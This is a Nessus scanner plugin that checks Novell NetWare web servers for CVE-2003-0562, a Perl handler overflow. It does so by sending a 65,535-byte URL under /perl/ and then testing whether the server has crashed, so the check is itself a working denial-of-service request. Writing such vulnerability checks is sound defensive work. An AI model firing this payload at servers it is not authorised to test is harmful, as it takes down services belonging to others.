#
# This script was written by Michel Arboi <arboi@alussinan.org>
#
# GPLv2
#
#
# Vulnerable:
# Netware 5.1 SP6, Netware 6
########################

if(description)
{
 script_id(11827);
 script_bugtraq_id(8251);
 script_version ("$Revision: 1.6 $");
 script_cve_id("CVE-2003-0562");

 name["english"] = "Netware Perl CGI overflow";
 script_name(english:name["english"]);
 
 desc["english"] = "
The remote web server crashes when it receives a too long URL
for the Perl handler.

It might be possible to make it execute arbitrary code through this flaw.
See http://support.novell.com/servlet/tidfinder/2966549

Risk factor : High

Solution : Upgrade your web server.";

 script_description(english:desc["english"]);
 
 summary["english"] = "Too long URL kills Netware Perl handler";
 script_summary(english:summary["english"]);
 
 script_category(ACT_DENIAL); 
# All the www_too_long_*.nasl scripts were first declared as 
# ACT_DESTRUCTIVE_ATTACK, but many web servers are vulnerable to them:
# The web server might be killed by those generic tests before Nessus 
# has a chance to perform known attacks for which a patch exists
# As ACT_DENIAL are performed one at a time (not in parallel), this reduces
# the risk of false positives.
 
 script_copyright(english:"This script is Copyright (C) 2003 Michel Arboi");
 family["english"] = "Gain root remotely";
 family["francais"] = "Passer root à distance";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes");
 script_require_ports("Services/www",80);
 script_exclude_keys("www/too_long_url_crash");
 exit(0);
}

#

include("http_func.inc");

port = get_http_port(default:80);

if (! get_port_state(port)) exit(0);

if(http_is_dead(port:port))exit(0);

soc = http_open_socket(port);
if (!soc) exit(0);

req = string("/perl/", crap(65535));
req = http_get(item:req, port:port);
send(socket:soc, data:req);
r = http_recv(socket:soc);
http_close_socket(soc);

if(http_is_dead(port: port, retry:1))
{
  security_hole(port);
  #set_kb_item(name:"www/too_long_url_crash", value:TRUE);
}
